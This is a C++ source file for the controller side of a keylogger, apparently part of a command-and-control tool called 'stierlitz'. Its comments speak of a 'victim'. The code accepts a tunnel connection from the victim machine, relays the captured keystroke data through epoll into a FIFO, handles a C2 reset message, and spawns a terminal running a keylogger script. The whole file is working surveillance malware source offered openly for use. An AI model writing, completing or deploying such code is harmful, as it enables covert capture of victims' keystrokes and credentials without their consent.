#include "keylogger.hpp"

// Child process spawning the window
// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
void Keylogger::exec_spy() {
    int rc = accept_tunnel_end();
    if (rc < 0) {
        return;
    }

    send_dev();

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        return;
    }
    
    struct epoll_event tunnel_end_event;
    tunnel_end_event.data.fd = tunnel_end_socket_;
    tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &tunnel_end_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel end socket to epoll " + std::string(strerror(errno)));
        return;
    }
    
    char buf[BUFFER_SIZE];

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
            break;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } else if(events[i].data.fd == tunnel_end_socket_) {
                int bytes_read = recv(tunnel_end_socket_, buf, sizeof(buf), 0);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    if (memcmp(buf, OUT_KEY, OUT_KEY_LEN) == 0) {
                        write_fifo_error("[SpyTunnel::run] An error occurred during tunnel execution");
                        return;
                    }
                    rc = write(tunnel_fifo_, buf, bytes_read);
                    if (rc < 0) {
                        return;
                    }
                }
            }
        }
    }

}

void Keylogger::set_layout(const std::string& __layout) {
    layout_ = __layout;
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-hold", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), layout_.c_str(), out_name_.c_str(), (char*)NULL);
}

void Keylogger::send_dev() {
    send(tunnel_end_socket_, &dev_num_, sizeof(dev_num_), 0);
}